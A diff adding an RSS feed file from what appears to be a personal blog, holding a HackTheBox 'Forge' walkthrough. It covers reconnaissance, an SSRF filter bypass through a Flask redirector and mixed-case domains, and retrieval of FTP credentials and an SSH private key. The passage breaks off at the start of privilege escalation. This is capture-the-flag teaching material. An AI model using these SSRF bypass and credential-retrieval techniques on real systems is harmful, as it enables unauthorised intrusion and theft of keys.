@@ -1,0 +1,1539 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>OSCP-like Machines on Ef&#39;s log</title>
+    <link>https://fahmifj.github.io/threads/oscp-like-machines/</link>
+    <description>Recent content in OSCP-like Machines on Ef&#39;s log</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Sat, 15 Oct 2022 21:57:48 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/threads/oscp-like-machines/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox - Forge</title>
+      <link>https://fahmifj.github.io/ctf/hackthebox/forge/</link>
+      <pubDate>Sat, 15 Oct 2022 21:57:48 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/ctf/hackthebox/forge/</guid>
+      <description>Bypass SSRF filters using domain redirection and abusing Python PDB</description>
+      <content:encoded><![CDATA[<p>Forge features a website that has SSRF vulnerability on its upload page. Leveraging this SSRF allows me to access the internal admin portal to obtain an FTP account. The SSRF vulnerability also exists within the admin portal, allowing me  to access the FTP server and retrieve the user&rsquo;s SSH key. As for the root part, there&rsquo;s a Python script with sudo privileges that spawns an interactive debugging session when an exception event occurs. Since the script can be run as root, it is possible to abuse the interactive debugging session to spawn a root shell.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>SSRF bypass filters</li>
+<li>Code Review</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>nmap</li>
+<li>ffuf</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Scanning TCP ports with nmap discovers 2 open ports: SSH and HTTP. There&rsquo;s also a filtered FTP service.</p>
+<figure class="highlight">
+    <figcaption>
+        <span class="hl-cmd">$ nmap -sC -sV -oA nmap/default-script-forge 10.10.11.111</span>
+    </figcaption>
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «forge» «10.10.14.4» 
+</span></span><span class="line"><span class="cl">$ nmap -sC -sV -oA nmap/default-script-forge 10.10.11.111   
+</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-13 10:54 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> forge.htb <span class="o">(</span>10.10.11.111<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.066s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">997</span> closed ports
+</span></span><span class="line"><span class="cl">PORT   STATE    SERVICE VERSION
+</span></span><span class="line"><span class="cl">21/tcp filtered ftp
+</span></span><span class="line"><span class="cl">22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open     http    Apache httpd 2.4.41
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Gallery
+</span></span><span class="line"><span class="cl">Service Info: Host: 10.10.11.111<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 11.61 seconds</span></span></code></pre>
+</figure><p>Beside the OS and service version, the results didn&rsquo;t show any interesting details.</p>
+<p>For now, I will just add <code>forge.htb</code> to my <code>/etc/hosts</code>.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «~» «10.10.15.190» 
+</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.11.111 forge.htb&#39;</span> <span class="p">|</span> sudo tee -a /etc/hosts</span></span></code></pre>
+</figure><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---forgehtb">TCP 80 - forge.htb</h3>
+<p>The main website shows a gallery of images.</p>
+<p><div class="img-container"><img src="imgs/image-20210913200846701.png" alt="image-20210913200846701"  /></div>
+</p>
+<p>Using Wapplyzer, it tells that the site is running on PHP.</p>
+<p><div class="img-container"><img src="imgs/image-20221013203144811.png" alt="image-20221013203144811"  /></div>
+</p>
+<p>There&rsquo;s an upload page at <code>/upload</code>, which allows visitors to upload a file from local disk or a URL.</p>
+<p><div class="img-container"><img src="imgs/image-20210913201318274.png" alt="image-20210913201318274"  /></div>
+</p>
+<h4 id="testing-upload">Testing Upload</h4>
+<p>On submitting a legit JPG file, it returns with a URL to access the file.</p>
+<p><div class="img-container"><img src="imgs/image-20221013210552525.png" alt="image-20221013210552525"  /></div>
+</p>
+<p>Since filenames are randomized, IDOR attack isn&rsquo;t an option here.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «tools» «10.10.15.190» 
+</span></span><span class="line"><span class="cl">$ curl -IL http://forge.htb/uploads/nMu63RoLNdk8BoE2a7b4 
+</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">Date: Thu, <span class="m">13</span> Sept <span class="m">2021</span> 14:06:11 GMT
+</span></span><span class="line"><span class="cl">Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Content-Disposition: inline<span class="p">;</span> <span class="nv">filename</span><span class="o">=</span>nMu63RoLNdk8BoE2a7b4
+</span></span><span class="line"><span class="cl">Content-Length: <span class="m">51142</span>
+</span></span><span class="line"><span class="cl">Last-Modified: Thu, <span class="m">13</span> Sept <span class="m">2021</span> 14:05:20 GMT
+</span></span><span class="line"><span class="cl">Cache-Control: no-cache
+</span></span><span class="line"><span class="cl">Content-Type: image/jpg</span></span></code></pre>
+</figure><p>This time, I&rsquo;ll try the <strong>upload from url</strong> option. I&rsquo;ll start a Python web server listening on port 8000. On submitting, there is a request coming from Forge&rsquo;s IP.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «~» «10.10.15.190» 
+</span></span><span class="line"><span class="cl">$ python3 -m http.server <span class="m">8000</span>
+</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">8000</span> <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
+</span></span><span class="line"><span class="cl">10.10.11.111 - - <span class="o">[</span>13/Sep/2021 09:23:38<span class="o">]</span> <span class="s2">&#34;GET /innocent.jpg HTTP/1.1&#34;</span> <span class="m">200</span> -</span></span></code></pre>
+</figure><p>With <code>netcat</code>, I could see the detailed request where I can see that it&rsquo;s coming from the Python&rsquo;s request module. So I&rsquo;m guessing that the site is running on Python (most likely Flask).</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «~» «10.10.15.190» 
+</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">8000</span> 
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">8000</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.15.190<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.111<span class="o">]</span> <span class="m">43242</span>
+</span></span><span class="line"><span class="cl">GET /innocent.jpg HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 10.10.15.190:8000
+</span></span><span class="line"><span class="cl">User-Agent: python-requests/2.25.1
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">Accept: */*
+</span></span><span class="line"><span class="cl">Connection: keep-alive
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">too many output retries : Broken pipe</span></span></code></pre>
+</figure><p>By trying to upload a non existent file path, the error output proves that it&rsquo;s using Python in the back end.</p>
+<p><div class="img-container"><img src="imgs/image-20210913203132729.png" alt="	"  /></div>
+</p>
+<p>When attempting to access <code>localhost</code> and <code>127.0.0.1</code>, the website tells that these addresses are blacklisted.</p>
+<p><div class="img-container"><img src="imgs/image-20210913203935343.png" alt=" "  /></div>
+</p>
+<p>How about FTP? Well only <code>http</code> and <code>https</code> protocols are supported here. Therefore, I can&rsquo;t touch the FTP server with this (yet).</p>
+<p><div class="img-container"><img src="imgs/image-20221013213206158.png" alt="image-20221013213206158"  /></div>
+</p>
+<h3 id="vhost-enumeration">Vhost Enumeration</h3>
+<p>Fuzzing the vhost using <code>ffuf</code> reveals an interesting subdomain: <code>admin.forge.htb</code>.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «tools» «10.10.15.190» 
+</span></span><span class="line"><span class="cl">$ ffuf -u http://forge.htb -H <span class="s2">&#34;Host: FUZZ.forge.htb&#34;</span> -mc <span class="m">200</span> -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\ </span>      
+</span></span><span class="line"><span class="cl">       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/       
+</span></span><span class="line"><span class="cl">       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\ </span>     
+</span></span><span class="line"><span class="cl">        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/      
+</span></span><span class="line"><span class="cl">         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\ </span>      
+</span></span><span class="line"><span class="cl">          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/       
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       v1.3.0-dev
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> :: Method           : GET
+</span></span><span class="line"><span class="cl"> :: URL              : http://forge.htb
+</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+</span></span><span class="line"><span class="cl"> :: Header           : Host: FUZZ.forge.htb
+</span></span><span class="line"><span class="cl"> :: Follow redirects : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Calibration      : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Timeout          : <span class="m">10</span>
+</span></span><span class="line"><span class="cl"> :: Threads          : <span class="m">40</span>
+</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: <span class="m">200</span>
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">admin                   <span class="o">[</span>Status: 200, Size: 27, Words: 4, Lines: 2<span class="o">]</span></span></span></code></pre>
+</figure><p>I&rsquo;ll add that domain to my <code>/etc/hosts</code>.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «tools» «10.10.15.190» 
+</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.11.111 admin.forge.htb&#39;</span> <span class="p">|</span> sudo tee -a /etc/hosts</span></span></code></pre>
+</figure><h3 id="tcp-80---adminforgehtb">TCP 80 - admin.forge.htb</h3>
+<p>Unfortunately, visiting <code>admin.forge.htb</code> shows a message that this domain is only reachable from localhost.</p>
+<p><div class="img-container"><img src="imgs/image-20210913210859484.png" alt="image-20210913210859484"  /></div>
+</p>
+<p>When trying to access this domain from the upload feature, it would return the same message about blacklisted address.</p>
+<p><div class="img-container"><img src="imgs/image-20210913212229777.png" alt="image-20210913212229777"  /></div>
+</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-user">Shell as user</h3>
+<h4 id="ssrf-bypass-with-domain-redirection">SSRF Bypass with Domain Redirection</h4>
+<p>Several SSRF bypass with number-based payload are actually works and can be used to access localhost address, but I&rsquo;ve to find domain-based bypass since the web server routes/handles <code>forge.htb</code> and <code>admin.forge.htb</code> differently (allow external access vs. internal access only).</p>
+<p>Based on the previous upload testing, the site is using Python Requests module. The <code>requests.get()</code> function is <a href="https://requests.readthedocs.io/en/latest/user/quickstart/#redirection-and-history"target="_blank" rel="noopener noreferrer"
+>always follow redirection by default</a>. Knowing this, there&rsquo;s a high chance that bypassing the SSRF filter using domain redirection would work.</p>
+<p>Here&rsquo;s the strategy:</p>
+<ul>
+<li>Host a simple site redirector that always redirect any incoming request to <code>http://admin.forge.htb</code>.</li>
+<li>Submit the redirector URL on the upload page at <code>forge.htb/upload</code>.</li>
+</ul>
+<p>And here&rsquo;s the visualization of how the SSRF filter bypass using domain redirection.</p>
+<p><div class="img-container"><img src="imgs/image-20221015214529436.png" alt="image-20221015214529436"  /></div>
+</p>
+<p>I&rsquo;ll write the redirector using Flask.</p>
+<p><code>redirector.py</code>:</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">redirect</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s2">&#34;http://admin.forge.htb/&#34;</span><span class="p">,</span><span class="n">code</span><span class="o">=</span><span class="mi">302</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">80</span><span class="p">)</span></span></span></code></pre>
+</figure><p>I&rsquo;ll run the redirector with:</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.13» 
+</span></span><span class="line"><span class="cl">$ python3 redirector.py</span></span></code></pre>
+</figure><p>After the redirector is running, I&rsquo;ll head to the upload page, intercept the upload request and change the URL value to my machine IP.</p>
+<p>On submitting the request, I see there&rsquo;s a success message in the response.</p>
+<p><div class="img-container"><img src="imgs/image-20221015112628345.png" alt="image-20221015112628345"  /></div>
+</p>
+<p>A little explanation:</p>
+<ol>
+<li>My IP is not in the blacklist address, so the site (Forge) starts making a request to it, where eventually falls in to the redirector site.</li>
+<li>Since <code>requests.get()</code> follows redirection by default, the request goes straight to the site I intended to redirect to, which is <code>admin.forge.htb</code>. It eventually bypasses the checks for blacklisted addresses.</li>
+<li>Finally, the site takes the whole <code>admin.forge.htb</code> page as a file content and uploads it to the <code>forge.htb/upload</code>. Now I can see <code>admin.forge.htb</code> page by accessing that file from the given URL.</li>
+</ol>
+<h4 id="ssrf-bypass-with-mixed-case">SSRF Bypass with Mixed Case</h4>
+<p>Another way to bypass the filters is mixing upper case and lower case on the domain name like <code>admin.forge.htB</code>:</p>
+<p><div class="img-container"><img src="imgs/image-20210913214359458.png" alt="image-20210913214359458"  /></div>
+</p>
+<p>Both bypass methods are working fine.</p>
+<p>Now with <code>curl</code>, I could see the page source of <code>admin.forge.htb</code>. There&rsquo;s two links here: <code>/announcements</code> and another <code>/upload</code>.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «forge» «10.10.14.13» 
+</span></span><span class="line"><span class="cl">$ curl -s http://forge.htb/uploads/mn4G5G1B5oaF2SXMwbHH
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE html&gt;
+</span></span><span class="line"><span class="cl">&lt;html&gt;
+</span></span><span class="line"><span class="cl">&lt;head&gt;
+</span></span><span class="line"><span class="cl">    &lt;title&gt;Admin Portal&lt;/title&gt;
+</span></span><span class="line"><span class="cl">&lt;/head&gt;
+</span></span><span class="line"><span class="cl">&lt;body&gt;
+</span></span><span class="line"><span class="cl">    &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;text/css&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/main.css&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">    &lt;header&gt;
+</span></span><span class="line"><span class="cl">            &lt;nav&gt;
+</span></span><span class="line"><span class="cl">                &lt;h1 <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;&#34;</span>&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/&#34;</span>&gt;Portal home&lt;/a&gt;&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">                &lt;h1 <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;align-right margin-right&#34;</span>&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/announcements&#34;</span>&gt;Announcements&lt;/a&gt;&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">                &lt;h1 <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;align-right&#34;</span>&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/upload&#34;</span>&gt;Upload image&lt;/a&gt;&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">            &lt;/nav&gt;
+</span></span><span class="line"><span class="cl">    &lt;/header&gt;
+</span></span><span class="line"><span class="cl">    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
+</span></span><span class="line"><span class="cl">    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
+</span></span><span class="line"><span class="cl">    &lt;center&gt;&lt;h1&gt;Welcome Admins!&lt;/h1&gt;&lt;/center&gt;
+</span></span><span class="line"><span class="cl">&lt;/body&gt;
+</span></span><span class="line"><span class="cl">&lt;/html&gt;</span></span></code></pre>
+</figure><p>Accessing <code>/announcements</code> via SSRF reveals interesting information:</p>
+<ul>
+<li>An FTP account</li>
+<li>The upload feature in this admin portal now supports FTP and upload via query string <code>u</code> (<code>/upload?u=value</code>).</li>
+</ul>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «forge» «10.10.14.4» 
+</span></span><span class="line"><span class="cl">$ curl -s http://forge.htb/uploads/NatO83YkYfhzkl9fG9MB
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE html&gt;
+</span></span><span class="line"><span class="cl">&lt;html&gt;
+</span></span><span class="line"><span class="cl">&lt;head&gt;
+</span></span><span class="line"><span class="cl">    &lt;title&gt;Announcements&lt;/title&gt;
+</span></span><span class="line"><span class="cl">&lt;/head&gt;
+</span></span><span class="line"><span class="cl">&lt;body&gt;
+</span></span><span class="line"><span class="cl">    &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;text/css&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/main.css&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">    &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;text/css&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/announcements.css&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">    &lt;header&gt;
+</span></span><span class="line"><span class="cl">            &lt;nav&gt;
+</span></span><span class="line"><span class="cl">                &lt;h1 <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;&#34;</span>&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/&#34;</span>&gt;Portal home&lt;/a&gt;&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">                &lt;h1 <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;align-right margin-right&#34;</span>&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/announcements&#34;</span>&gt;Announcements&lt;/a&gt;&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">                &lt;h1 <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;align-right&#34;</span>&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/upload&#34;</span>&gt;Upload image&lt;/a&gt;&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">            &lt;/nav&gt;
+</span></span><span class="line"><span class="cl">    &lt;/header&gt;
+</span></span><span class="line"><span class="cl">    &lt;br&gt;&lt;br&gt;&lt;br&gt;
+</span></span><span class="line"><span class="cl">    &lt;ul&gt;
+</span></span><span class="line"><span class="cl">        &lt;li&gt;An internal ftp server has been setup with credentials as user:heightofsecurity123!&lt;/li&gt;
+</span></span><span class="line"><span class="cl">        &lt;li&gt;The /upload endpoint now supports ftp, ftps, http and https protocols <span class="k">for</span> uploading from url.&lt;/li&gt;
+</span></span><span class="line"><span class="cl">        &lt;li&gt;The /upload endpoint has been configured <span class="k">for</span> easy scripting of uploads, and <span class="k">for</span> uploading an image, one can simply pass a url with ?u<span class="o">=</span><span class="p">&amp;</span>lt<span class="p">;</span>url<span class="p">&amp;</span>gt<span class="p">;</span>.&lt;/li&gt;
+</span></span><span class="line"><span class="cl">    &lt;/ul&gt;
+</span></span><span class="line"><span class="cl">&lt;/body&gt;
+</span></span><span class="line"><span class="cl">&lt;/html&gt;</span></span></code></pre>
+</figure><h4 id="ftp-access">FTP Access</h4>
+<p>From here, I can try accessing the FTP service via the upload feature on the admin portal using the same SSRF bypass technique.</p>
+<p><div class="img-container"><img src="imgs/image-20221015121407530.png" alt="image-20221015121407530"  /></div>
+</p>
+<p>It seems the FTP host the user home dir. The user flag is done here.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «forge» «10.10.14.4» 
+</span></span><span class="line"><span class="cl">$ curl -s http://forge.htb/uploads/0c47HKRZiXNh3F5smn2z
+</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">3</span> <span class="m">1000</span>     <span class="m">1000</span>         <span class="m">4096</span> Aug <span class="m">04</span> 19:23 snap
+</span></span><span class="line"><span class="cl">-rw-r-----    <span class="m">1</span> <span class="m">0</span>        <span class="m">1000</span>           <span class="m">33</span> Sep <span class="m">13</span> 08:17 user.txt</span></span></code></pre>
+</figure><h4 id="ssh-access">SSH Access</h4>
+<p>For more stable access, I&rsquo;ll check if there&rsquo;s an SSH key:</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">http://admin.forge.htB/upload?u=ftp://user:heightofsecurity123!@forge.htB/.ssh/</span></span></code></pre>
+</figure><p>It&rsquo;s there.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «forge» «10.10.14.4» 
+</span></span><span class="line"><span class="cl">$ curl -s http://forge.htb/uploads/AC1f3sbHcufWHGGTVpIG 
+</span></span><span class="line"><span class="cl">-rw-------    <span class="m">1</span> <span class="m">1000</span>     <span class="m">1000</span>          <span class="m">564</span> May <span class="m">31</span> 12:35 authorized_keys
+</span></span><span class="line"><span class="cl">-rw-------    <span class="m">1</span> <span class="m">1000</span>     <span class="m">1000</span>         <span class="m">2590</span> May <span class="m">20</span> 08:30 id_rsa
+</span></span><span class="line"><span class="cl">-rw-------    <span class="m">1</span> <span class="m">1000</span>     <span class="m">1000</span>          <span class="m">564</span> May <span class="m">20</span> 08:30 id_rsa.pub</span></span></code></pre>
+</figure><p>I&rsquo;ll grab that with</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">http://admin.forge.htB/upload?u=ftp://:heightofsecurity123!@forge.htB/.ssh/id_rsa</span></span></code></pre>
+</figure><p>And save it to my machine.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «forge» «10.10.14.4» 
+</span></span><span class="line"><span class="cl">$ curl -s http://forge.htb/uploads/hvcNBsh1xwD4c6Nyq0tP <span class="p">|</span> tee user_rsa
+</span></span><span class="line"><span class="cl">-----BEGIN OPENSSH PRIVATE KEY-----
+</span></span><span class="line"><span class="cl">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span><span class="line"><span class="cl">nR7k4+Pryk8HqgNS3/g1/Fpd52DDziDOAIfORntwkuiQSlg63hF3vadCAV3KIVLtBONXH2
+</span></span><span class="line"><span class="cl"><span class="nv">shlLupso7WoS0AAAAKdXNlckBmb3JnZQE</span><span class="o">=</span>
+</span></span><span class="line"><span class="cl">-----END OPENSSH PRIVATE KEY-----</span></span></code></pre>
+</figure><p>Now I can SSH login as <code>user</code>.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «forge» «10.10.14.4» 
+</span></span><span class="line"><span class="cl">$ chmod <span class="m">600</span> user_rsa <span class="o">&amp;&amp;</span> ssh -i user_rsa user@forge.htb  
+</span></span><span class="line"><span class="cl">Welcome to Ubuntu 20.04.3 LTS <span class="o">(</span>GNU/Linux 5.4.0-81-generic x86_64<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  System information as of Mon <span class="m">13</span> Sep <span class="m">2021</span> 03:12:44 PM UTC
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  System load:  0.0               Processes:             <span class="m">223</span>
+</span></span><span class="line"><span class="cl">  Usage of /:   44.5% of 6.82GB   Users logged in:       <span class="m">0</span>
+</span></span><span class="line"><span class="cl">  Memory usage: 26%               IPv4 address <span class="k">for</span> eth0: 10.10.11.111
+</span></span><span class="line"><span class="cl">  Swap usage:   0%
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Last login: Mon Sep <span class="m">13</span> 13:30:33 <span class="m">2021</span> from 10.10.14.141
+</span></span><span class="line"><span class="cl">user@forge:~$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span></span></span></code></pre>
+</figure><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-root">Shell as root</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p><code>user</code> is allowed to run <code>/opt/remote-manage.py</code> as root.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@forge:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> user on forge:
